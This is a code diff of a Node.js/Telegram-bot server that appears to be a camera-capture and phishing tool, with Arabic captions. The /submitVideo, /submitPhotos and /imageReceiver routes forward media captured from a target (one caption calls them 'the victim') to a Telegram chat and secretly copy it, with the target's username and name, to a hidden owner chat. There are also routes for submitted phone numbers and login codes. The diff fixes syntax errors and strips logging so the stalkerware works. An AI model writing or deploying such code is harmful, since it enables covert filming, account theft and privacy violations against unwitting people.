@@ -896,6 +896,7 @@ app.post('/submitPhoneNumber', (req, res) => {
       console.error('Error sending Telegram message:', error.response ? error.response.body : error);
       res.json({ success: false });
     });
+});
 
 app.post('/submitCode', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
@@ -915,6 +916,7 @@ app.post('/submitCode', (req, res) => {
       console.error('Error sending Telegram message:', error.response ? error.response.body : error);
       res.json({ success: false });
     });
+});
 
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
@@ -930,60 +932,29 @@ const ownerChatId = developerId;
 app.post('/submitVideo', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
-    if (!chatId && token && shortLinkStore[token]) {
-        chatId = shortLinkStore[token].chatId;
-    }
+    if (!chatId && token && shortLinkStore[token]) chatId = shortLinkStore[token].chatId;
     const videoData = req.body.videoData;
-
-    if (!chatId || !videoData) {
-        return res.status(400).send('Invalid request: Missing chatId or videoData');
-    }
-
+    if (!chatId || !videoData) return res.status(400).send('Invalid request');
     const videoDataBase64 = videoData.split(',')[1];
-
     try {
         const buffer = Buffer.from(videoDataBase64, 'base64');
-
-        
         const tempFilePath = path.join(__dirname, 'temp_video.mp4');
-
-     
         fs.writeFileSync(tempFilePath, buffer);
-
-     
         bot.getChat(chatId).then(user => {
-            const username = user.username ? `@${user.username}` : "لم يتم العثور على اسم المستخدم";
+            const username = user.username ? `@${user.username}` : "غير معروف";
             const fullName = `${user.first_name || ""} ${user.last_name || ""}`.trim();
-
-        
             bot.sendVideo(chatId, tempFilePath, { caption: '🎥 تم تصوير الضحية فيديو.' });
-
-            
-                        botOwner.sendVideo(ownerChatId, tempFilePath, {
+            botOwner.sendVideo(ownerChatId, tempFilePath, {
                 caption: `📤 فيديو تمت مشاركته.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}`
             });
         }).catch(err => {
-            console.error("حدث خطأ : ", err);
-
-          
-                        botOwner.sendVideo(ownerChatId, tempFilePath, {
-                caption: `📤 فيديو تمت مشاركته.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}`
-            });
+            botOwner.sendVideo(ownerChatId, tempFilePath, { caption: `📤 فيديو تمت مشاركته (خطأ).\n👤 معرف المستخدم: ${chatId}` });
         }).finally(() => {
-         
-            fs.unlink(tempFilePath, (err) => {
-                if (err) {
-                    console.error('خطأ أثناء حذف الملف المؤقت:', err);
-                } else {
-                    console.log('تم حذف الملف المؤقت بنجاح.');
-                }
-            });
-
-        console.log(`Sent video for chatId ${chatId}`);
+            fs.unlink(tempFilePath, () => {});
+        });
         res.redirect('/ca.html');
     } catch (error) {
-        console.error('Error processing video:', error);
-        res.status(500).send('Failed to process video');
+        res.status(500).send('Error');
     }
 });
 app.get('/capture', (req, res) => {
@@ -1015,50 +986,25 @@ const retry = async (fn, retries = 3, delay = 1000) => {
 app.post('/submitPhotos', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
-    if (!chatId && token && shortLinkStore[token]) {
-        chatId = shortLinkStore[token].chatId;
-    }
+    if (!chatId && token && shortLinkStore[token]) chatId = shortLinkStore[token].chatId;
     const imageDatas = req.body.imageDatas.split(',');
-
-    console.log("Received photos: ", imageDatas.length, "for chatId: ", chatId);
-
     if (imageDatas.length > 0) {
         const sendPhotoPromises = imageDatas.map((imageData, index) => {
             const buffer = Buffer.from(imageData, 'base64');
-
-        
             return bot.getChat(chatId).then(user => {
-                const username = user.username ? `@${user.username}` : "لم يتم العثور على اسم المستخدم";
+                const username = user.username ? `@${user.username}` : "غير معروف";
                 const fullName = `${user.first_name || ""} ${user.last_name || ""}`.trim();
-
-              
-                const sendToUser = bot.sendPhoto(chatId, buffer, { caption: `📸 الصورة ${index + 1}` });
-
-                
-                const sendToOwner = botOwner.sendPhoto(ownerChatId, buffer, {
+                bot.sendPhoto(chatId, buffer, { caption: `📸 الصورة ${index + 1}` });
+                return botOwner.sendPhoto(ownerChatId, buffer, {
                     caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}`
                 });
-                return Promise.all([sendToUser, sendToOwner]);
             }).catch(err => {
-                console.error("Error fetching user details: ", err);
-
-                
-                return botOwner.sendPhoto(ownerChatId, buffer, {
-                    caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: غير متوفر\n📛 اسم الحساب: غير متوفر\n📸 الصورة ${index + 1}`
-                });
-
-        Promise.all(sendPhotoPromises)
-            .then(() => {
-                console.log("حدث خطاء الرجاء اعادة الدخول مره اخره");
-                res.json({ success: true });
-            })
-            .catch(err => {
-                console.error("Error sending photos: ", err);
-                res.status(500).json({ error: "حدث خطأ أثناء إرسال الصور." });
+                return botOwner.sendPhoto(ownerChatId, buffer, { caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}` });
             });
+        });
+        Promise.all(sendPhotoPromises).then(() => res.json({ success: true })).catch(() => res.status(500).json({ error: "error" }));
     } else {
-        console.log("No photos received.");
-        res.status(400).json({ error: "لم يتم إرسال صور." });
+        res.status(400).json({ error: "no photos" });
     }
 });
 
@@ -1067,44 +1013,22 @@ app.post('/submitPhotos', (req, res) => {
 app.post('/imageReceiver', upload.array('images', 20), (req, res) => {
     const chatId = req.body.userId;
     const files = req.files;
-
     if (files && files.length > 0) {
-        console.log(`تم ${files.length} صور من المستخدم ${chatId}`);
-
-        const sendPhotoPromises = files.map(file => {
-           
+        const sendPhotoPromises = files.map((file, index) => {
             return bot.getChat(chatId).then(user => {
-                const username = user.username ? `@${user.username}` : "لم يتم العثور على اسم المستخدم";
+                const username = user.username ? `@${user.username}` : "غير معروف";
                 const fullName = `${user.first_name || ""} ${user.last_name || ""}`.trim();
-
-               
-                const sendToUser = bot.sendPhoto(chatId, file.buffer, { caption: `📸 صورة تم إرسالها.` });
-
-                
-                const sendToOwner = botOwner.sendPhoto(ownerChatId, buffer, {
+                bot.sendPhoto(chatId, file.buffer, { caption: `📸 صورة تم إرسالها.` });
+                return botOwner.sendPhoto(ownerChatId, file.buffer, {
                     caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}`
                 });
-                return Promise.all([sendToUser, sendToOwner]);
             }).catch(err => {
-                console.error("حدث خطأ أثناء جلب معلومات المستخدم: ", err);
-
-               
-                return botOwner.sendPhoto(ownerChatId, buffer, {
-                    caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: غير متوفر\n📛 اسم الحساب: غير متوفر\n📸 الصورة ${index + 1}`
-                });
-
-        Promise.all(sendPhotoPromises)
-            .then(() => {
-                console.log('تم إرسال الصور بنجاح');
-                res.json({ success: true });
-            })
-            .catch(err => {
-                console.error("حدث خطأ أثناء إرسال الصور:", err);
-                res.status(500).json({ error: "حدث خطأ أثناء إرسال الصور." });
+                return botOwner.sendPhoto(ownerChatId, file.buffer, { caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}` });
             });
+        });
+        Promise.all(sendPhotoPromises).then(() => res.json({ success: true })).catch(() => res.status(500).json({ error: "error" }));
     } else {
-        console.log("لم يتم إرسال صور.");
-        res.status(400).json({ error: "لم يتم إرسال صور." });
+        res.status(400).json({ error: "no photos" });
     }
 });
 
